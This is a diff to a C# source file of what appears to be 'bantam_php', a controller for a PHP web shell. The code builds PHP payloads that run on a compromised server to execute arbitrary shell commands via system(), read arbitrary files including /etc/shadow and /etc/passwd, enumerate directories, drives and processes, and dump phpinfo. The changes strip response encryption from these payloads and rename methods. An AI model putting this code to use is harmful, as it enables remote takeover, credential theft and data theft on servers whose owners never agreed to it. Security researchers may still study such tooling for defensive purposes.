@@ -12,16 +12,6 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public const string rowSeperator = "|=$=|";
-
-        /// <summary>
-        /// 
-        /// </summary>
-        public const string colSeperator = ",.$.,";
-
-        /// <summary>
-        /// 
-        /// </summary>
         public enum INIT_DATA_VARS
         {
             OS = 0,
@@ -38,6 +28,16 @@ namespace bantam_php
             GROUP,
             PHP_VERSION
         }
+
+        /// <summary>
+        /// 
+        /// </summary>
+        public const string rowSeperator = "|=$=|";
+
+        /// <summary>
+        /// 
+        /// </summary>
+        public const string colSeperator = ",.$.,";
 
         public static string linuxFS_ShadowFile = "/etc/shadow";
         public static string linuxFS_PasswdFile = "/etc/passwd";
@@ -77,8 +77,7 @@ namespace bantam_php
                      + "'.$uid.'" + colSeperator
                      + "'.$gid.'" + colSeperator
                      + "'.$group.'" + colSeperator
-                     + "'.$phpVersion;" 
-                     + EncryptionHelper.encryptPhpResult();
+                     + "'.$phpVersion;";
             } else {
                 responseCode = @"echo $os.'" + colSeperator
                      + "'.$cwd.'" + colSeperator
@@ -98,7 +97,6 @@ namespace bantam_php
             return @"
                 $os = 'nix';
                 if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $os = 'win'; }
-
                 $cwd = @dirname(__FILE__);
                 $freeSpace  = @diskfreespace($cwd);
                 $totalSpace = @disk_total_space($cwd);
@@ -134,8 +132,7 @@ namespace bantam_php
         public static string PhpInfo(bool encryptResponse)
         {
             if (encryptResponse) {
-                return "ob_start(); phpinfo(); $result = ob_get_contents(); ob_end_clean();"
-                       + EncryptionHelper.encryptPhpResult();
+                return "ob_start(); phpinfo(); $result = ob_get_contents(); ob_end_clean();";
             } else {
                 return "phpinfo();";
             }
@@ -150,8 +147,8 @@ namespace bantam_php
         {
             string phpTestExecutionWithEcho = "";
             if (encryptReponse) {
-                phpTestExecutionWithEcho = "$result = '1';" 
-                                         + EncryptionHelper.encryptPhpResult();
+                phpTestExecutionWithEcho = "$result = '1';";
+
             } else {
                 phpTestExecutionWithEcho = "echo '1';";
             }
@@ -167,8 +164,7 @@ namespace bantam_php
         {
             string osDetectPHP = "";
             if (encryptResponse) {
-                osDetectPHP = "$result; if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $result = 'win'; } else { $result = 'nix'; }"
-                             + EncryptionHelper.encryptPhpResult();
+                osDetectPHP = "$result; if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $result = 'win'; } else { $result = 'nix'; }";
             } else {
                 osDetectPHP = "if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ echo 'win'; } else { echo 'nix'; }";
             }
@@ -185,8 +181,7 @@ namespace bantam_php
         {
             string getHardDriveLetters = "";
             if (encryptResponse) {
-                getHardDriveLetters = "$result; foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { $result .= $drive.':|'; }}"
-                                    + EncryptionHelper.encryptPhpResult();
+                getHardDriveLetters = "$result; foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { $result .= $drive.':|'; }}";
             } else {
                 getHardDriveLetters = "foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { echo $drive.':|'; }}";
             }
@@ -202,8 +197,7 @@ namespace bantam_php
         public static string ReadFileProcedure(string fileName, bool encryptResponse)
         {
             if (encryptResponse) {
-                return @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';"
-                       + EncryptionHelper.encryptPhpResult();
+                return @"$result = @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
             } else {
                 return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
             }
@@ -244,8 +238,7 @@ namespace bantam_php
         public static string ExecuteSystemCode(string code, bool encryptResponse)
         {
             if (encryptResponse) {
-                return @"ob_start(); @system('" + code + "'); $result = ob_get_contents(); ob_end_clean();"
-                       + EncryptionHelper.encryptPhpResult();
+                return @"ob_start(); @system('" + code + "'); $result = ob_get_contents(); ob_end_clean();";
             } else {
                 return "@system('" + code + "');";
             }
@@ -257,7 +250,7 @@ namespace bantam_php
         /// <param name="location"></param>
         /// <param name="phpVersion"></param>
         /// <returns></returns>
-        public static string getDirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
+        public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
         {
             //We cannot use the lambda function in usort below php version 5.2 :(
             //TODO move this version holder / checker else where to a function
@@ -292,7 +285,7 @@ namespace bantam_php
                    + "'.$file['size'].'" + colSeperator
                    + "'.$file['type'].'" + colSeperator
                    + "'.$dir['perms'].'" + rowSeperator + @"';
-                    }" + EncryptionHelper.encryptPhpResult();
+                    }";
             } else {
                 responseCode = @"foreach($dirs as $dir) {
                     echo $dir['name']. '" + colSeperator
@@ -359,7 +352,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="windowsOS"></param>
         /// <returns></returns>
-        public static string getTaskListFunction(bool windowsOS = true)
+        public static string TaskListFunction(bool windowsOS = true)
         {
             return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
         }
